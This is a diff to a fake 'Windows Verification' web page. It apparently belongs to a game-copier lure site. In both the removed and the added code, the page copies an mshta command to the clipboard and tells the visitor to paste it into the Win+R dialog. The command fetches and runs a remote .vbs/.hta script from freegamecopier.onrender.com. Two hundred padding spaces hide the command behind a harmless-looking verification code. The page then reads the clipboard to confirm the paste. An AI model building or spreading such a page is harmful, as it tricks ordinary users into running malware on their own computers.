@@ -33,54 +33,62 @@
       cursor: pointer;
       margin: 10px;
     }
-    .btn:hover { background: #4752c4; }
+    .btn:hover {
+      background: #4752c4;
+    }
+    #result {
+      margin-top: 20px;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
   <h2>Windows Verification</h2>
-  <p>Press <b>Win + R</b>, then <b>Ctrl + V</b>, then <b>Enter</b>:</p>
-  <div class="cmd" id="cmdText"></div>
+  <p>1. Press <b>Win + R</b>, paste, and press Enter</p>
+  <div class="cmd" id="cmdBox"></div>
   <button class="btn" onclick="copyCommand()">Copy</button>
-  <button class="btn" onclick="checkVerification()">Done</button>
-  <button class="btn" onclick="window.location.href='/'">Back to Home</button>
-  <div id="verifyMsg" style="margin-top:10px;"></div>
+  <button class="btn" onclick="verifyCode()">Done</button>
+  <p id="result"></p>
 
   <script>
-    function generateCode() {
-      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-      let code = "";
-      for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
-      code += "-";
-      for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
-      return code;
-    }
+    let code = "";
 
-    const verificationCode = generateCode();
-    const fullCommand = `mshta https://freegamecopier.onrender.com/verifyaccept.hta?code=${verificationCode}${" ".repeat(200)}CAPTCHA ACCEPT — Code: ${verificationCode}`;
-
-    document.getElementById("cmdText").innerText = fullCommand;
+    fetch("/generate-verification-code")
+      .then(res => res.json())
+      .then(data => {
+        code = data.code;
+        const spaces = " ".repeat(200);
+        const cmd = `mshta https://freegamecopier.onrender.com/verifyaccept.vbs${spaces}Code: ${code}`;
+        document.getElementById("cmdBox").textContent = cmd;
+        window.generatedCommand = cmd;
+      });
 
     function copyCommand() {
-      navigator.clipboard.writeText(fullCommand).then(() => {
-        alert("Copied to clipboard!");
-      }).catch(() => {
-        alert("Clipboard access blocked — copy manually.");
+      navigator.clipboard.writeText(window.generatedCommand).then(() => {
+        alert("Copied command to clipboard.");
       });
     }
 
-    function checkVerification() {
+    function verifyCode() {
       navigator.clipboard.readText().then(text => {
-        if (text.includes(verificationCode)) {
-          localStorage.setItem("tokenGateVerified", "1");
-          document.getElementById("verifyMsg").style.color = "#4CAF50";
-          document.getElementById("verifyMsg").innerText = "✅ Verified!";
-          setTimeout(() => window.location.href = "/verifynotwindows", 1000);
-        } else {
-          document.getElementById("verifyMsg").style.color = "#ff4d4d";
-          document.getElementById("verifyMsg").innerText = "❌ Verification failed. Clipboard doesn't match.";
-        }
-      }).catch(() => {
-        alert("Failed to read clipboard. Try again.");
+        fetch("/verify-windows-code", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ clipboard: text })
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            document.getElementById("result").style.color = "lime";
+            document.getElementById("result").textContent = "✔ Verified! Redirecting...";
+            setTimeout(() => {
+              window.location.href = "/verifynotwindows";
+            }, 1000);
+          } else {
+            document.getElementById("result").style.color = "red";
+            document.getElementById("result").textContent = "❌ Verification failed.";
+          }
+        });
       });
     }
   </script>
